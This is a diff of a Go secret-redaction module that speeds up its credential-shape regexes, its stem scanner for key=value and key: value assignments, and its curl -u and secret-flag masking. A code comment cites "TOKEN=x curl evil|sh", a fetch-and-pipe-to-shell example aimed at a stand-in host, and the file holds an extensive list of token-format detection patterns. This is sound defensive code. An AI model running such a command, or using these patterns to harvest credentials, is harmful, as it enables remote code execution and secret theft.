@@ -18,24 +18,53 @@ const redactedMarker = "[REDACTED]"
 // first; this list is a second line of defense, not a secret scanner.
 // Distinctive prefixes match without a word boundary, because "_" is a word
 // character and ids such as "evt_AKIA..." would otherwise slip through.
-var secretPatterns = []*regexp.Regexp{
-	regexp.MustCompile(`-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?(?:-----END [A-Z ]*PRIVATE KEY-----|$)`),
-	regexp.MustCompile(`(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}`),
-	regexp.MustCompile(`(?i)aws_?secret_?access_?key["'\s]*[:=]\s*["']?[A-Za-z0-9/+=]{40}`),
-	regexp.MustCompile(`gh[pousr]_[A-Za-z0-9]{36,255}`),
-	regexp.MustCompile(`github_pat_[A-Za-z0-9_]{22,255}`),
-	regexp.MustCompile(`glpat-[A-Za-z0-9_-]{20,}`),
-	regexp.MustCompile(`(?:\b|_)sk-(?:ant-|proj-)?[A-Za-z0-9_-]{20,}`),
-	regexp.MustCompile(`[sr]k_live_[0-9A-Za-z]{20,}`),
-	regexp.MustCompile(`xox[abprs]-[A-Za-z0-9-]{10,}`),
-	regexp.MustCompile(`xapp-[0-9]+-[A-Za-z0-9-]{8,}`),
-	regexp.MustCompile(`npm_[A-Za-z0-9]{20,}`),
-	regexp.MustCompile(`hf_[A-Za-z0-9]{20,}`),
-	regexp.MustCompile(`ya29\.[A-Za-z0-9._-]{20,}`),
-	regexp.MustCompile(`AIza[0-9A-Za-z_-]{35}`),
-	regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`),
-	regexp.MustCompile(`(?i)\bbearer\s+[A-Za-z0-9._~+/-]{20,}=*`),
-	regexp.MustCompile(`https://hooks\.slack\.com/(?:services|workflows|triggers)/[A-Za-z0-9/_-]+`),
+//
+// Each pattern lists literals one of which every match contains, so a
+// value without any skips the regexp, which otherwise steps every byte.
+// A fold pattern's literals are lowercase and compared with an
+// ASCII-lowercased value; they avoid "k" and "s", the only ASCII
+// letters (?i) also matches as a non-ASCII rune (the Kelvin sign, long s).
+var secretPatterns = []shapePattern{
+	{regexp.MustCompile(`-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?(?:-----END [A-Z ]*PRIVATE KEY-----|$)`), []string{"-----BEGIN "}, false},
+	{regexp.MustCompile(`(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}`), []string{"AKIA", "ASIA", "ABIA", "ACCA"}, false},
+	{regexp.MustCompile(`(?i)aws_?secret_?access_?key["'\s]*[:=]\s*["']?[A-Za-z0-9/+=]{40}`), []string{"acce"}, true},
+	{regexp.MustCompile(`gh[pousr]_[A-Za-z0-9]{36,255}`), []string{"ghp_", "gho_", "ghu_", "ghs_", "ghr_"}, false},
+	{regexp.MustCompile(`github_pat_[A-Za-z0-9_]{22,255}`), []string{"github_pat_"}, false},
+	{regexp.MustCompile(`glpat-[A-Za-z0-9_-]{20,}`), []string{"glpat-"}, false},
+	{regexp.MustCompile(`(?:\b|_)sk-(?:ant-|proj-)?[A-Za-z0-9_-]{20,}`), []string{"sk-"}, false},
+	{regexp.MustCompile(`[sr]k_live_[0-9A-Za-z]{20,}`), []string{"k_live_"}, false},
+	{regexp.MustCompile(`xox[abprs]-[A-Za-z0-9-]{10,}`), []string{"xox"}, false},
+	{regexp.MustCompile(`xapp-[0-9]+-[A-Za-z0-9-]{8,}`), []string{"xapp-"}, false},
+	{regexp.MustCompile(`npm_[A-Za-z0-9]{20,}`), []string{"npm_"}, false},
+	{regexp.MustCompile(`hf_[A-Za-z0-9]{20,}`), []string{"hf_"}, false},
+	{regexp.MustCompile(`ya29\.[A-Za-z0-9._-]{20,}`), []string{"ya29."}, false},
+	{regexp.MustCompile(`AIza[0-9A-Za-z_-]{35}`), []string{"AIza"}, false},
+	{regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`), []string{"eyJ"}, false},
+	{regexp.MustCompile(`(?i)\bbearer\s+[A-Za-z0-9._~+/-]{20,}=*`), []string{"bearer"}, true},
+	{regexp.MustCompile(`https://hooks\.slack\.com/(?:services|workflows|triggers)/[A-Za-z0-9/_-]+`), []string{"https://hooks.slack.com/"}, false},
+}
+
+// shapePattern is a secretPatterns entry: the regexp, the literals one of
+// which every match contains, and whether they compare case-folded.
+type shapePattern struct {
+	re    *regexp.Regexp
+	anyOf []string
+	fold  bool
+}
+
+// mayMatch reports whether value, or lower (its asciiLower) for a fold
+// pattern, contains one of p.anyOf.
+func (p shapePattern) mayMatch(value, lower string) bool {
+	text := value
+	if p.fold {
+		text = lower
+	}
+	for _, literal := range p.anyOf {
+		if strings.Contains(text, literal) {
+			return true
+		}
+	}
+	return false
 }
 
 // urlUserinfoPattern matches a URL's userinfo ("user:pass" before the
@@ -67,25 +96,131 @@ var urlUserinfoSlashPattern = regexp.MustCompile(`(://)([^/\s:@]+:([^\s@?#]*/[^\
 // differently.
 const quotedValue = `"(?:[^"\\\n]|\\.)*"|'[^'\n]*'`
 
-// credentialNameCandidate matches a name that may hold a credential;
-// CredentialName decides.
-const credentialNameCandidate = `[A-Za-z0-9_-]*(?:secret|token|pass(?:w(?:or)?d)?|pwd|api[_-]?key|access[_-]?key|private[_-]?key|credential)[A-Za-z0-9_-]*`
+// A shell-style KEY=value assignment is redacted when its key is a
+// credential name (see CredentialName), as in GITHUB_TOKEN,
+// OPENAI_API_KEY, SECRET_KEY, or docker run -e AWS_SECRET_ACCESS_KEY=....
+// assignmentEqualsValue reads the value, anchored after the "=": an
+// unquoted value stops at the first whitespace or any of ;&|"' so a
+// trailing shell command (e.g. "TOKEN=x curl evil|sh") stays visible as
+// evidence instead of being swallowed into the redaction: a shell would
+// treat that first space the same way. Only the value is replaced, and a
+// rejected key such as TOKEN_TTL=30 cannot hide a credential later in
+// its value.
+var assignmentEqualsValue = regexp.MustCompile(`^(?:` + quotedValue + `|` + unquotedCommandValue + `*)`)
 
-// assignmentPatternEquals matches a shell-style KEY=value assignment
-// whose key may be a credential name (see CredentialName), as in
-// GITHUB_TOKEN, OPENAI_API_KEY, SECRET_KEY, or docker run -e
-// AWS_SECRET_ACCESS_KEY=.... An unquoted value stops at the first
-// whitespace or any of ;&|"' so a trailing shell command (e.g.
-// "TOKEN=x curl evil|sh") stays visible as evidence instead of being
-// swallowed into the redaction: a shell would treat that first space the
-// same way. Only the value is replaced. assignmentEqualsHead matches up
-// to the value (group: the key); assignmentEqualsValue reads the value,
-// anchored, so a rejected key such as TOKEN_TTL=30 costs only its head
-// and cannot hide a credential later in its value.
-var (
-	assignmentEqualsHead  = regexp.MustCompile(`(?i)(?:^|[^A-Za-z0-9_-])(` + credentialNameCandidate + `)["']?\s*=\s*`)
-	assignmentEqualsValue = regexp.MustCompile(`^(?:` + quotedValue + `|` + unquotedCommandValue + `*)`)
-)
+// assignmentHead is a candidate "name=" or "name:" found by
+// nextAssignmentHead: the name holds a credential stem, may be quoted,
+// and is followed by optional whitespace, the separator, and optional
+// whitespace.
+type assignmentHead struct {
+	start                 int // the name, or the quote right before it
+	nameEnd               int
+	name                  string
+	openQuote, closeQuote string
+	sep                   string // the separator with its whitespace
+	valStart              int
+}
+
+// stemScanner finds credentialStems in an ASCII-lowercased copy of a
+// value with strings.Index, remembering each stem's next occurrence, so
+// a scan whose position only moves forward is linear. It replaces a
+// case-insensitive name regexp, which cannot skip ahead to a literal and
+// steps every byte.
+type stemScanner struct {
+	lower string
+	next  []int // per stem: next occurrence, -1 for none left, -2 unknown
+}
+
+func newStemScanner(value string) *stemScanner {
+	s := &stemScanner{lower: asciiLower(value), next: make([]int, len(credentialStems))}
+	for i := range s.next {
+		s.next[i] = -2
+	}
+	return s
+}
+
+// find returns the first stem occurrence at or after pos, or -1.
+func (s *stemScanner) find(pos int) int {
+	best := -1
+	for i, stem := range credentialStems {
+		if s.next[i] == -1 {
+			continue
+		}
+		if s.next[i] < pos {
+			j := strings.Index(s.lower[pos:], stem)
+			if j < 0 {
+				s.next[i] = -1
+				continue
+			}
+			s.next[i] = pos + j
+		}
+		if best < 0 || s.next[i] < best {
+			best = s.next[i]
+		}
+	}
+	return best
+}
+
+func asciiLower(value string) string {
+	b := []byte(value)
+	for i, c := range b {
+		if 'A' <= c && c <= 'Z' {
+			b[i] = c + 'a' - 'A'
+		}
+	}
+	return string(b)
+}
+
+func isNameByte(c byte) bool { return isAlnum(c) || c == '_' || c == '-' }
+
+// isRegexpSpace is RE2's \s.
+func isRegexpSpace(c byte) bool {
+	return c == ' ' || c == '\t' || c == '\n' || c == '\f' || c == '\r'
+}
+
+// nextAssignmentHead returns the first head at or after pos whose
+// separator is sep ('=' or ':'). The name is the whole run of
+// [A-Za-z0-9_-] around a stem, bounded below by pos, as is a quote
+// before it.
+func nextAssignmentHead(value string, scan *stemScanner, pos int, sep byte) (assignmentHead, bool) {
+	for {
+		floor := pos
+		hit := scan.find(pos)
+		if hit < 0 {
+			return assignmentHead{}, false
+		}
+		nameStart, nameEnd := hit, hit
+		for nameStart > floor && isNameByte(value[nameStart-1]) {
+			nameStart--
+		}
+		for nameEnd < len(value) && isNameByte(value[nameEnd]) {
+			nameEnd++
+		}
+		pos = nameEnd
+		h := assignmentHead{start: nameStart, nameEnd: nameEnd, name: value[nameStart:nameEnd]}
+		if nameStart > floor && (value[nameStart-1] == '"' || value[nameStart-1] == '\'') {
+			h.start, h.openQuote = nameStart-1, value[nameStart-1:nameStart]
+		}
+		j := nameEnd
+		if j < len(value) && (value[j] == '"' || value[j] == '\'') {
+			h.closeQuote = value[j : j+1]
+			j++
+		}
+		sepStart := j
+		for j < len(value) && isRegexpSpace(value[j]) {
+			j++
+		}
+		if j == len(value) || value[j] != sep {
+			continue
+		}
+		j++
+		for j < len(value) && isRegexpSpace(value[j]) {
+			j++
+		}
+		h.sep, h.valStart = value[sepStart:j], j
+		return h, true
+	}
+}
 
 // credentialWords are the name segments (split on "_" and "-") that mark
 // a credential, also as a segment suffix (PGPASSWORD, _authToken) and
@@ -144,21 +279,9 @@ func CredentialName(name string) bool {
 	return false
 }
 
-// credentialStems covers every word credentialNameCandidate can match.
+// credentialStems are lowercase substrings every CredentialName name
+// contains; stemScanner looks for them.
 var credentialStems = []string{"secret", "token", "pass", "pwd", "key", "credential"}
-
-// mayNameCredential is a fast prefilter for RedactAssignments: the head
-// patterns cannot use a literal prefix, so text with no credential stem
-// at all skips them.
-func mayNameCredential(value string) bool {
-	lower := strings.ToLower(value)
-	for _, stem := range credentialStems {
-		if strings.Contains(lower, stem) {
-			return true
-		}
-	}
-	return false
-}
 
 func credentialSegment(segment string) bool {
 	for _, word := range credentialWords {
@@ -175,20 +298,16 @@ func credentialSegment(segment string) bool {
 // the closing ")" or "`".
 const unquotedCommandValue = "[^\\s;&|\"'\\n)`]"
 
-// assignmentPatternColon matches a "key: value" credential, as opposed
-// to shell-style KEY=value: a line such as "token: abc def" is not shell
-// syntax, so, unlike the "=" form, there is no shell word boundary to
-// preserve and an unquoted value runs to the end of the line (or to one
-// of ;&|"', in case the line is itself embedded in a larger shell
-// command); trailing whitespace is not part of it. Groups: open quote,
-// key, close quote, separator; redactColonAssignments reads the value
-// itself, so a rejected key costs only its head. A match only counts in
-// a header or assignment context (see colonAssignmentContext), so free
-// text such as git commit -m 'fix token: handling' is left alone.
-var (
-	assignmentColonHead   = regexp.MustCompile(`(?i)(["']?)(` + credentialNameCandidate + `)(["']?)(\s*:\s*)`)
-	assignmentQuotedValue = regexp.MustCompile(`^(?:` + quotedValue + `)`)
-)
+// A "key: value" credential, as opposed to shell-style KEY=value: a
+// line such as "token: abc def" is not shell syntax, so, unlike the "="
+// form, there is no shell word boundary to preserve and an unquoted
+// value runs to the end of the line (or to one of ;&|"', in case the
+// line is itself embedded in a larger shell command); trailing
+// whitespace is not part of it. A head only counts in a header or
+// assignment context (see colonAssignmentContext), so free text such as
+// git commit -m 'fix token: handling' is left alone.
+// assignmentQuotedValue reads a quoted value, anchored.
+var assignmentQuotedValue = regexp.MustCompile(`^(?:` + quotedValue + `)`)
 
 // colonValueEnd lists the bytes that end an unquoted "key: value" value.
 const colonValueEnd = ";&|\"'\n"
@@ -263,6 +382,11 @@ func LooksLikeUserPass(value string) bool {
 // quoted ("--token" abc). Groups: open quote, flag, close quote,
 // separator. RedactSecretFlags checks the left word boundary itself.
 //
+// RedactSecretFlags tries secretFlagHead, anchored, only where a word
+// can start with a flag: a "-" at a word boundary, or the quote right
+// before it. The head's optional leading quote gives the regexp no
+// literal prefix to skip to, so searching with it would step every byte.
+//
 // The value after the separator is read with secretFlagEqualValue or
 // secretFlagSpaceValue, anchored, so a rejected candidate costs only its
 // head and redaction stays linear in the input. Both use the quotedValue
@@ -272,7 +396,7 @@ func LooksLikeUserPass(value string) bool {
 // "--token --verbose" does not eat the next flag; an "=" value may
 // ("--token=-abc"), since "=" unambiguously ends the flag name.
 var (
-	secretFlagHead       = regexp.MustCompile(`(?i)(["']?)(` + SecretFlagAlternation() + `)(["']?)(=|\s+)`)
+	secretFlagHead       = regexp.MustCompile(`(?i)^(["']?)(` + SecretFlagAlternation() + `)(["']?)(=|\s+)`)
 	secretFlagEqualValue = regexp.MustCompile(`^(?:` + quotedValue + `|` + unquotedCommandValue + `*)`)
 	secretFlagSpaceValue = regexp.MustCompile(`^(?:` + quotedValue + `|[^-\s;&|"'\n)` + "`" + `]` + unquotedCommandValue + `*)`)
 )
@@ -291,16 +415,28 @@ var literalArgFlags = map[string]bool{"-e": true, "--regexp": true, "-m": true, 
 func RedactSecretFlags(value string) (string, []string) {
 	var removed []string
 	var b strings.Builder
-	pos := 0
+	pos, written := 0, 0
 	for pos < len(value) {
-		m := secretFlagHead.FindStringSubmatchIndex(value[pos:])
-		if m == nil {
+		dash := strings.IndexByte(value[pos:], '-')
+		if dash < 0 {
 			break
 		}
-		for i := range m {
-			m[i] += pos
+		start := pos + dash
+		if start > pos && (value[start-1] == '"' || value[start-1] == '\'') {
+			start--
 		}
-		start, sepEnd := m[0], m[1]
+		var m []int
+		if wordBoundaryBefore(value, start) {
+			m = secretFlagHead.FindStringSubmatchIndex(value[start:])
+		}
+		if m == nil {
+			pos += dash + 1
+			continue
+		}
+		for i := range m {
+			m[i] += start
+		}
+		sepEnd := m[1]
 		openQuote, closeQuote := value[m[2]:m[3]], value[m[6]:m[7]]
 		valuePattern := secretFlagSpaceValue
 		if value[m[8]] == '=' {
@@ -308,25 +444,23 @@ func RedactSecretFlags(value string) (string, []string) {
 		}
 		var body string
 		var loc []int
-		if wordBoundaryBefore(value, start) &&
-			(closeQuote == "" || closeQuote == openQuote) &&
-			!literalArgFlags[previousWord(value, start)] {
+		if (closeQuote == "" || closeQuote == openQuote) && !literalArgFlags[previousWord(value, start)] {
 			loc = valuePattern.FindStringIndex(value[sepEnd:])
 		}
 		if loc != nil {
 			body = value[sepEnd : sepEnd+loc[1]]
 		}
+		pos = sepEnd
 		if loc == nil || placeholderSecret(body) {
-			b.WriteString(value[pos:sepEnd])
-			pos = sepEnd
 			continue
 		}
 		removed = append(removed, unquote(body))
-		b.WriteString(value[pos:sepEnd])
+		b.WriteString(value[written:sepEnd])
 		b.WriteString(quoteLike(body, redactedMarker))
-		pos = sepEnd + len(body)
+		pos += len(body)
+		written = pos
 	}
-	b.WriteString(value[pos:])
+	b.WriteString(value[written:])
 	return b.String(), removed
 }
 
@@ -359,10 +493,12 @@ func unquote(value string) string {
 	return value
 }
 
-// userFlagPattern matches curl's -u/--user/-user flag and its value:
-// "-u value", "-u=value", or glued ("-uuser:pass", curl's documented
-// short form). Groups: boundary, flag, separator, value.
-var userFlagPattern = regexp.MustCompile(`(?i)(^|\s)(` + UserFlagAlternation + `)(=|\s+|)(` + quotedValue + `|` + unquotedCommandValue + `*)`)
+// userFlagPattern matches curl's -u/--user/-user flag and its value,
+// anchored at the flag: "-u value", "-u=value", or glued ("-uuser:pass",
+// curl's documented short form). Groups: flag, separator, value.
+// RedactUserFlags tries it only at a "-" that starts the text or follows
+// whitespace.
+var userFlagPattern = regexp.MustCompile(`(?i)^(` + UserFlagAlternation + `)(=|\s+|)(` + quotedValue + `|` + unquotedCommandValue + `*)`)
 
 // RedactUserFlags replaces the value of a curl-style -u/--user/-user flag
 // with [REDACTED] when it has "user:pass" shape, and returns the raw
@@ -373,9 +509,25 @@ var userFlagPattern = regexp.MustCompile(`(?i)(^|\s)(` + UserFlagAlternation + `
 // adapter's source-side redaction, so both phases agree.
 func RedactUserFlags(value string) (string, []string) {
 	var removed []string
-	out := userFlagPattern.ReplaceAllStringFunc(value, func(match string) string {
-		g := userFlagPattern.FindStringSubmatch(match)
-		boundary, flag, separator, body := g[1], g[2], g[3], g[4]
+	var b strings.Builder
+	pos, written := 0, 0
+	for pos < len(value) {
+		dash := strings.IndexByte(value[pos:], '-')
+		if dash < 0 {
+			break
+		}
+		start := pos + dash
+		var g []int
+		if start == 0 || (start > pos && isRegexpSpace(value[start-1])) {
+			g = userFlagPattern.FindStringSubmatchIndex(value[start:])
+		}
+		if g == nil {
+			pos += dash + 1
+			continue
+		}
+		end := start + g[1]
+		pos = end
+		flag, separator, body := value[start+g[2]:start+g[3]], value[start+g[4]:start+g[5]], value[start+g[6]:end]
 		if separator == "" {
 			switch strings.ToLower(flag) {
 			case "-u":
@@ -383,28 +535,39 @@ func RedactUserFlags(value string) (string, []string) {
 				body = flag[2:] + body
 				flag = flag[:2]
 			default:
-				return match
+				continue
 			}
 		}
 		if !LooksLikeUserPass(body) || placeholderSecret(body) {
-			return match
+			continue
 		}
 		removed = append(removed, strings.Trim(body, `"'`))
-		return boundary + flag + separator + quoteLike(body, redactedMarker)
-	})
-	return out, removed
+		b.WriteString(value[written:start])
+		b.WriteString(flag + separator + quoteLike(body, redactedMarker))
+		written = end
+	}
+	b.WriteString(value[written:])
+	return b.String(), removed
 }
 
 // DefaultRedactor replaces well-known credential shapes with [REDACTED].
 // Already-redacted text, such as "sk-***REDACTED***abcd", is unchanged.
 func DefaultRedactor(value string) string {
-	value = authorizationPattern.ReplaceAllString(value, "${1}"+redactedMarker)
+	if strings.Contains(asciiLower(value), "authorization") {
+		value = authorizationPattern.ReplaceAllString(value, "${1}"+redactedMarker)
+	}
 	value, _ = RedactSecretFlags(value)
 	value, _ = RedactUserFlags(value)
 	value, _ = RedactToolFlags(value)
 	value, _ = RedactURLUserinfo(value)
+	lower := asciiLower(value)
 	for _, pattern := range secretPatterns {
-		value = pattern.ReplaceAllString(value, redactedMarker)
+		if !pattern.mayMatch(value, lower) {
+			continue
+		}
+		if out := pattern.re.ReplaceAllString(value, redactedMarker); out != value {
+			value, lower = out, asciiLower(out)
+		}
 	}
 	value, _ = RedactAssignments(value)
 	return value
@@ -454,49 +617,41 @@ func RedactURLUserinfo(value string) (string, []string) {
 // YAML/JSON "token: ..." line, the same way DefaultRedactor's second line
 // does. It returns the redacted text and the raw values it removed.
 func RedactAssignments(value string) (string, []string) {
-	if !mayNameCredential(value) {
-		return value, nil
-	}
 	var removed []string
 	value = redactEqualsAssignments(value, &removed)
 	value = redactColonAssignments(value, &removed)
 	return value, removed
 }
 
-// redactColonAssignments applies assignmentColonHead where
+// redactColonAssignments redacts each "key:" head (nextAssignmentHead) where
 // colonAssignmentContext accepts the match. A rejected head is skipped
 // whole: a candidate starting inside it would follow a key byte or a
 // quote, which no context accepts.
 func redactColonAssignments(value string, removed *[]string) string {
+	scan := newStemScanner(value)
 	var b strings.Builder
 	pos := 0
-	for pos < len(value) {
-		m := assignmentColonHead.FindStringSubmatchIndex(value[pos:])
-		if m == nil {
+	for {
+		h, found := nextAssignmentHead(value, scan, pos, ':')
+		if !found {
 			break
 		}
-		for i := range m {
-			m[i] += pos
-		}
-		start, valStart := m[0], m[1]
-		openQuote, closeQuote := value[m[2]:m[3]], value[m[6]:m[7]]
 		body := ""
-		ok := (start == 0 || !isAlnum(value[start-1])) && CredentialName(value[m[4]:m[5]])
+		ok := (h.start == 0 || !isAlnum(value[h.start-1])) && CredentialName(h.name)
 		if ok {
 			var stop string
-			if ok, stop = colonAssignmentContext(value, start, openQuote, closeQuote, value[m[4]:m[5]], value[m[8]:m[9]]); ok {
-				body = colonValue(value[valStart:], stop)
+			if ok, stop = colonAssignmentContext(value, h.start, h.openQuote, h.closeQuote, h.name, h.sep); ok {
+				body = colonValue(value[h.valStart:], stop)
 			}
 		}
+		b.WriteString(value[pos:h.valStart])
+		pos = h.valStart
 		if !ok || placeholderSecret(body) {
-			b.WriteString(value[pos:valStart])
-			pos = valStart
 			continue
 		}
 		*removed = append(*removed, strings.Trim(body, `"'`))
-		b.WriteString(value[pos:valStart])
 		b.WriteString(quoteLike(body, redactedMarker))
-		pos = valStart + len(body)
+		pos += len(body)
 	}
 	b.WriteString(value[pos:])
 	return b.String()
@@ -586,30 +741,27 @@ func isAlnum(c byte) bool {
 	return c >= '0' && c <= '9' || c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z'
 }
 
-// redactEqualsAssignments applies assignmentEqualsHead where the key is
-// a CredentialName. A value starting with "-" after whitespace
-// ("token = -x") is the next flag, not the value.
+// redactEqualsAssignments redacts each "KEY=" head (nextAssignmentHead)
+// whose key is a CredentialName. A value starting with "-" after
+// whitespace ("token = -x") is the next flag, not the value.
 func redactEqualsAssignments(value string, removed *[]string) string {
+	scan := newStemScanner(value)
 	var b strings.Builder
 	pos := 0
-	for pos < len(value) {
-		m := assignmentEqualsHead.FindStringSubmatchIndex(value[pos:])
-		if m == nil {
+	for {
+		h, found := nextAssignmentHead(value, scan, pos, '=')
+		if !found {
 			break
 		}
-		for i := range m {
-			m[i] += pos
-		}
-		valStart := m[1]
 		body := ""
-		ok := CredentialName(value[m[2]:m[3]])
+		ok := CredentialName(h.name)
 		if ok {
-			loc := assignmentEqualsValue.FindStringIndex(value[valStart:])
-			body = value[valStart : valStart+loc[1]]
-			ok = !placeholderSecret(body) && (!strings.HasPrefix(body, "-") || !isCommandSpace(value[valStart-1]))
+			loc := assignmentEqualsValue.FindStringIndex(value[h.valStart:])
+			body = value[h.valStart : h.valStart+loc[1]]
+			ok = !placeholderSecret(body) && (!strings.HasPrefix(body, "-") || !isCommandSpace(value[h.valStart-1]))
 		}
-		b.WriteString(value[pos:valStart])
-		pos = valStart
+		b.WriteString(value[pos:h.valStart])
+		pos = h.valStart
 		if !ok {
 			continue
 		}
